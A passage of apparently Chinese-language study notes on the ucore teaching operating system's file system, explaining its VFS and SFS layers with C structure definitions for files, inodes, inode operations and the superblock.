<span class="hljs-keyword">char</span> *path1, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path2)</span></span>;       <span class="hljs-comment">// rename file</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_unlink</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path)</span></span>;                           <span class="hljs-comment">// unlink a path</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_getcwd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">size_t</span> len)</span></span>;                      <span class="hljs-comment">// get current working directory</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_getdirentry</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct dirent *direntp)</span></span>;        <span class="hljs-comment">// get the file entry in DIR </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_dup</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd1, <span class="hljs-keyword">int</span> fd2)</span></span>;                              <span class="hljs-comment">// duplicate file</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *fd_store)</span></span>;                                <span class="hljs-comment">// build PIPE   </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sysfile_mkfifo</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">uint32_t</span> open_flags)</span></span>;      <span class="hljs-comment">// build named PIPE</span><br></code></pre></div></td></tr></table></figure><p>然后调用file.c中具体的实现:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_open</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">uint32_t</span> open_flags)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_close</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_read</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">size_t</span> *copied_store)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_write</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">size_t</span> *copied_store)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_seek</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">off_t</span> pos, <span class="hljs-keyword">int</span> whence)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_fstat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct stat *stat)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_fsync</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_getdirentry</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct dirent *dirent)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_dup</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd1, <span class="hljs-keyword">int</span> fd2)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd[])</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">file_mkfifo</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">uint32_t</span> open_flags)</span></span>;<br></code></pre></div></td></tr></table></figure><p>sysfile_xxx算是在写操作系统的时候比较常用的函数.</p><h3 id="3-VFS层"><a href="#3-VFS层" class="headerlink" title="3.VFS层"></a>3.VFS层</h3><p>VFS有四个接口, 分别是file&amp;dir接口, inode接口, fs接口和外设接口. </p><h4 id="file-amp-dir接口"><a href="#file-amp-dir接口" class="headerlink" title="file&amp;dir接口"></a>file&amp;dir接口</h4><p>file&amp;dir接口层(共用一个结构体, 毕竟目录也是一种文件)定义了进程在内核中直接访问的文件相关信息，这定义在file数据结构中，具体描述如下：</p><blockquote><p>其中fd取决于进程的文件打开顺序, 最大值是<code>(4096 - sizeof(struct files_struct)) / sizeof(struct file)</code><br>而且在fd_array初始化的时候看起来file_struct和file挤满4KB空间, 不过不知道为什么</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>        FD_NONE, FD_INIT, FD_OPENED, FD_CLOSED,<br>    &#125; status;                         <span class="hljs-comment">//访问文件的执行状态</span><br>    <span class="hljs-keyword">bool</span> readable;                    <span class="hljs-comment">//文件是否可读</span><br>    <span class="hljs-keyword">bool</span> writable;                    <span class="hljs-comment">//文件是否可写</span><br>    <span class="hljs-keyword">int</span> fd;                           <span class="hljs-comment">//文件在filemap中的索引值</span><br>    <span class="hljs-keyword">off_t</span> pos;                        <span class="hljs-comment">//访问文件的当前位置</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">node</span>;</span>               <span class="hljs-comment">//该文件对应的内存inode指针</span><br>    <span class="hljs-keyword">int</span> open_count;                   <span class="hljs-comment">//打开此文件的次数</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>而在kern/process/proc.h中的proc_struct结构中描述了进程访问文件的数据接口files_struct，其数据结构定义如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">files_struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">pwd</span>;</span>                <span class="hljs-comment">//进程当前执行目录的内存inode指针</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">fd_array</span>;</span>            <span class="hljs-comment">//进程打开文件的数组</span><br>    <span class="hljs-keyword">atomic_t</span> files_count;             <span class="hljs-comment">//访问此文件的线程个数</span><br>    <span class="hljs-keyword">semaphore_t</span> files_sem;            <span class="hljs-comment">//确保对进程控制块中fs_struct的互斥访问</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>当创建一个进程后，该进程的files_struct将会被初始化或复制父进程的files_struct。当用户进程打开一个文件时，将从fd_array数组中取得一个空闲file项，然后会把此file的成员变量node指针指向一个代表此文件的inode的起始地址。</p><h4 id="inode接口"><a href="#inode接口" class="headerlink" title="inode接口"></a>inode接口</h4><p><u>index node</u>是位于内存的索引节点，它是VFS结构中的重要数据结构，因为它实际负责把不同文件系统的特定索引节点信息（甚至不能算是一个索引节点）统一封装起来，避免了进程直接访问具体文件系统。其定义如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span>                                 <span class="hljs-comment">//包含不同文件系统特定inode信息的union成员变量</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> __<span class="hljs-title">device_info</span>;</span>          <span class="hljs-comment">//设备文件系统内存inode信息</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_inode</span> __<span class="hljs-title">sfs_inode_info</span>;</span>    <span class="hljs-comment">//SFS文件系统内存inode信息</span><br>    &#125; in_info;   <br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>        inode_type_device_info = <span class="hljs-number">0x1234</span>,<br>        inode_type_sfs_inode_info,<br>    &#125; in_type;                          <span class="hljs-comment">//此inode所属文件系统类型</span><br>    <span class="hljs-keyword">atomic_t</span> ref_count;                 <span class="hljs-comment">//此inode的引用计数</span><br>    <span class="hljs-keyword">atomic_t</span> open_count;                <span class="hljs-comment">//打开此inode对应文件的个数</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs</span> *<span class="hljs-title">in_fs</span>;</span>                   <span class="hljs-comment">//抽象的文件系统，包含访问文件系统的函数指针</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> *<span class="hljs-title">in_ops</span>;</span>     <span class="hljs-comment">//抽象的inode操作，包含访问inode的函数指针     </span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>其中in_ops是一系列函数指针, 其实并不会全部用到, 只要定义需要的即可:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> &#123;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> vop_magic;<br>    <span class="hljs-keyword">int</span> (*vop_open)(struct inode *node, <span class="hljs-keyword">uint32_t</span> open_flags);<br>    <span class="hljs-keyword">int</span> (*vop_close)(struct inode *node);<br>    <span class="hljs-keyword">int</span> (*vop_read)(struct inode *node, struct iobuf *iob);<br>    <span class="hljs-keyword">int</span> (*vop_write)(struct inode *node, struct iobuf *iob);<br>    <span class="hljs-keyword">int</span> (*vop_fstat)(struct inode *node, struct stat *stat);<br>    <span class="hljs-keyword">int</span> (*vop_fsync)(struct inode *node);<br>    <span class="hljs-keyword">int</span> (*vop_namefile)(struct inode *node, struct iobuf *iob);<br>    <span class="hljs-keyword">int</span> (*vop_getdirentry)(struct inode *node, struct iobuf *iob);<br>    <span class="hljs-keyword">int</span> (*vop_reclaim)(struct inode *node);<br>    <span class="hljs-keyword">int</span> (*vop_gettype)(struct inode *node, <span class="hljs-keyword">uint32_t</span> *type_store);<br>    <span class="hljs-keyword">int</span> (*vop_tryseek)(struct inode *node, <span class="hljs-keyword">off_t</span> pos);<br>    <span class="hljs-keyword">int</span> (*vop_truncate)(struct inode *node, <span class="hljs-keyword">off_t</span> len);<br>    <span class="hljs-keyword">int</span> (*vop_create)(struct inode *node, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">bool</span> excl, struct inode **node_store);<br>    <span class="hljs-keyword">int</span> (*vop_lookup)(struct inode *node, <span class="hljs-keyword">char</span> *path, struct inode **node_store);<br>    <span class="hljs-keyword">int</span> (*vop_ioctl)(struct inode *node, <span class="hljs-keyword">int</span> op, <span class="hljs-keyword">void</span> *data);<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>实际用到的时候会使用宏定义简化, 利用语句块的值是最后一条语句的值来返回函数指针:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __vop_op(node, sym)                                                                         \</span><br><span class="hljs-meta">    (&#123;                                                                                              \</span><br><span class="hljs-meta">        struct inode *__node = (node);                                                              \</span><br><span class="hljs-meta">        assert(__node != NULL &amp;&amp; __node-&gt;in_ops != NULL &amp;&amp; __node-&gt;in_ops-&gt;vop_##sym != NULL);      \</span><br><span class="hljs-meta">        inode_check(__node, #sym);                                                                  \</span><br><span class="hljs-meta">        __node-&gt;in_ops-&gt;vop_##sym;  <span class="hljs-comment">/*把字符连接起来*/</span>                                               \</span><br><span class="hljs-meta">     &#125;)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> vop_open(node, open_flags)                                  (__vop_op(node, open)(node, open_flags))</span><br></code></pre></div></td></tr></table></figure><p><code>inode_ops</code>成员是对常规文件、目录、设备文件所有操作的一个抽象函数表示。对于某一具体的文件系统中的文件或目录，只需实现相关的函数，就可以被用户进程访问具体的文件了，且用户进程无需了解具体文件系统的实现细节。</p><p><strong>注意到这些是对下一层SFS的接口, 在下一层中被实现.</strong> 可选实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Function table for device inodes.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// The sfs specific DIR operations correspond to the abstract operations on a inode.</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> <span class="hljs-title">sfs_node_dirops</span> =</span> &#123;<br>    .vop_magic                      = VOP_MAGIC,<br>    .vop_open                       = sfs_opendir,<br>    .vop_close                      = sfs_close,<br>    .vop_fstat                      = sfs_fstat,<br>    .vop_fsync                      = sfs_fsync,<br>    .vop_namefile                   = sfs_namefile,<br>    .vop_getdirentry                = sfs_getdirentry,<br>    .vop_reclaim                    = sfs_reclaim,<br>    .vop_gettype                    = sfs_gettype,<br>    .vop_lookup                     = sfs_lookup,<br>&#125;;<br><span class="hljs-comment">/// The sfs specific FILE operations correspond to the abstract operations on a inode.</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> <span class="hljs-title">sfs_node_fileops</span> =</span> &#123;<br>    .vop_magic                      = VOP_MAGIC,<br>    .vop_open                       = sfs_openfile,<br>    .vop_close                      = sfs_close,<br>    .vop_read                       = sfs_read,<br>    .vop_write                      = sfs_write,<br>    .vop_fstat                      = sfs_fstat,<br>    .vop_fsync                      = sfs_fsync,<br>    .vop_reclaim                    = sfs_reclaim,<br>    .vop_gettype                    = sfs_gettype,<br>    .vop_tryseek                    = sfs_tryseek,<br>    .vop_truncate                   = sfs_truncfile,<br>&#125;;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode_ops</span> <span class="hljs-title">dev_node_ops</span> =</span> &#123;<br>    .vop_magic                      = VOP_MAGIC,<br>    .vop_open                       = dev_open,<br>    .vop_close                      = dev_close,<br>    .vop_read                       = dev_read,<br>    .vop_write                      = dev_write,<br>    .vop_fstat                      = dev_fstat,<br>    .vop_ioctl                      = dev_ioctl,<br>    .vop_gettype                    = dev_gettype,<br>    .vop_tryseek                    = dev_tryseek,<br>    .vop_lookup                     = dev_lookup,<br>&#125;;<br></code></pre></div></td></tr></table></figure><h4 id="fs接口"><a href="#fs接口" class="headerlink" title="fs接口"></a>fs接口</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_fs</span> __<span class="hljs-title">sfs_info</span>;</span>                   <br>    &#125; fs_info;                                     <span class="hljs-comment">// filesystem-specific data </span><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>        fs_type_sfs_info,<br>    &#125; fs_type;                                     <span class="hljs-comment">// filesystem type </span><br>    <span class="hljs-keyword">int</span> (*fs_sync)(struct fs *fs);                 <span class="hljs-comment">// Flush all dirty buffers to disk </span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *(*<span class="hljs-title">fs_get_root</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">fs</span> *<span class="hljs-title">fs</span>);</span>   <span class="hljs-comment">// Return root inode of filesystem.</span><br>    <span class="hljs-keyword">int</span> (*fs_unmount)(struct fs *fs);              <span class="hljs-comment">// Attempt unmount of filesystem.</span><br>    <span class="hljs-keyword">void</span> (*fs_cleanup)(struct fs *fs);             <span class="hljs-comment">// Cleanup of filesystem.???</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><hr><p>所以VFS具体是怎么个抽象法儿呢? </p><p>首先是对PCB中的文件进行抽象, 弄一个files_struct管理fd_array, 每个文件使用file进行定义, file中有基本的打开计数权限索引等等, 处于一个非常高的抽象层, 而且是针对用户的.</p><p>file中包含了一个index node指针, node记录了设备文件和SFS文件的inode信息(元数据), <strong>向下给sfs_inode和device提供了接口</strong>.</p><p>inode包含一个struct fs*, <strong>而fs向下接到了SFS层的sys_fs</strong>结构体, 这个才是具体到文件系统的总体信息, 比如super dev bitmap, 这些都是文件的磁盘布局信息.</p><p>当我们需要对文件file层面操作的时候(比如在path下查找 创建 删除等), 我们可以调用file对应inode(元数据)的函数指针, 实际上是调用了sfs层的函数去进行下一步的操作, inode充当的是中间层, 往下可以使各种各样的文件系统.</p><h3 id="4-SFS层"><a href="#4-SFS层" class="headerlink" title="4.SFS层"></a>4.SFS层</h3><p>SFS文件系统中目录和常规文件具有共同的属性，而这些属性保存在索引节点中。SFS通过索引节点来管理目录和常规文件，索引节点包含操作系统所需要的关于某个文件的关键信息，比如文件的属性、访问许可权以及其它控制信息都保存在索引节点中。多个文件名可指向一个索引节点。</p><h4 id="函数接口与数据结构"><a href="#函数接口与数据结构" class="headerlink" title="函数接口与数据结构"></a>函数接口与数据结构</h4><blockquote><p>在sfs.h中</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sfs_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_mount</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *devname)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">lock_sfs_fs</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">lock_sfs_io</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unlock_sfs_fs</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unlock_sfs_io</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_rblock</span><span class="hljs-params">(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">uint32_t</span> nblks)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_wblock</span><span class="hljs-params">(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">uint32_t</span> nblks)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_rbuf</span><span class="hljs-params">(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">off_t</span> offset)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_wbuf</span><span class="hljs-params">(struct sfs_fs *sfs, <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">off_t</span> offset)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_sync_super</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_sync_freemap</span><span class="hljs-params">(struct sfs_fs *sfs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_clear_block</span><span class="hljs-params">(struct sfs_fs *sfs, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">uint32_t</span> nblks)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sfs_load_inode</span><span class="hljs-params">(struct sfs_fs *sfs, struct inode **node_store, <span class="hljs-keyword">uint32_t</span> ino)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sfs_sync</span><span class="hljs-params">(struct fs *fs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> struct inode* <span class="hljs-title">sfs_get_root</span><span class="hljs-params">(struct fs *fs)</span> </span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sfs_unmount</span><span class="hljs-params">(struct fs *fs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sfs_cleanup</span><span class="hljs-params">(struct fs *fs)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">fs_init_read</span><span class="hljs-params">(struct device *dev, <span class="hljs-keyword">uint32_t</span> blkno, <span class="hljs-keyword">void</span> *blk_buffer)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">fs_do_mount</span><span class="hljs-params">(struct device *dev, struct fs **fs_store)</span></span>;<br><span class="hljs-comment">// ......</span><br></code></pre></div></td></tr></table></figure><p><code>sfs_fs</code>其实现如下所示</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* filesystem for sfs */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_fs</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_super</span> <span class="hljs-title">super</span>;</span>                         <span class="hljs-comment">/* on-disk superblock */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> *<span class="hljs-title">dev</span>;</span>                             <span class="hljs-comment">/* device mounted on */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bitmap</span> *<span class="hljs-title">freemap</span>;</span>                         <span class="hljs-comment">/* blocks in use are mared 0 */</span><br>    <span class="hljs-keyword">bool</span> super_dirty;                               <span class="hljs-comment">/* true if super/freemap modified */</span><br>    <span class="hljs-keyword">void</span> *sfs_buffer;                               <span class="hljs-comment">/* buffer for non-block aligned io 缓冲区起始地址*/</span><br>    <span class="hljs-keyword">semaphore_t</span> fs_sem;                             <span class="hljs-comment">/* semaphore for fs */</span><br>    <span class="hljs-keyword">semaphore_t</span> io_sem;                             <span class="hljs-comment">/* semaphore for io */</span><br>    <span class="hljs-keyword">semaphore_t</span> mutex_sem;                          <span class="hljs-comment">/* semaphore for link/unlink and rename */</span><br>    <span class="hljs-keyword">list_entry_t</span> inode_list;                        <span class="hljs-comment">/* inode linked-list 应该是在内存中的*/</span><br>    <span class="hljs-keyword">list_entry_t</span> *hash_list;                        <span class="hljs-comment">/* inode hash linked-list */</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p><code>sfs_fs</code>结构中包含了底层设备的超级块<code>superblock</code>、所挂载的设备<code>dev</code>、以及底层设备中用于表示空间分配情况的<code>freemap</code>等。</p><h4 id="文件系统布局"><a href="#文件系统布局" class="headerlink" title="文件系统布局"></a>文件系统布局</h4><p><img src="../../image/ucore/image-20220105200753016.png" alt="image-20220105200753016"></p><p>文件系统通常保存在磁盘上。在本实验中，第三个磁盘（即disk0，前两个磁盘分别是 ucore.img 和 swap.img）用于存放一个SFS文件系统（Simple Filesystem）。通常文件系统中，磁盘的使用是以扇区（Sector）为单位的，但是为了实现简便，SFS 中以 <strong>block</strong> （4K，与内存 page 大小相等）为基本单位。</p><p>第0个块(4K)是<strong>superblock</strong>，它包含了关于文件系统的所有关键参数，当计算机被启动或文件系统被首次接触时，超级块的内容就会被装入内存。其定义如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sfs_super</span> &#123;</span><br>    <span class="hljs-keyword">uint32_t</span> magic;                                  <span class="hljs-comment">/* magic number, should be SFS_MAGIC */</span><br>    <span class="hljs-keyword">uint32_t</span> blocks;                                 <span class="hljs-comment">/* # of blocks in fs */</span><br>    <span class="hljs-keyword">uint32_t</span> unused_blocks;                         <span class="hljs-comment">/* # of unused blocks in fs */</span><br>    <span class="hljs-keyword">char</span> info[SFS_MAX_INFO_LEN + <span class="hljs-number">1</span>];                <span class="hljs-comment">/* infomation for sfs  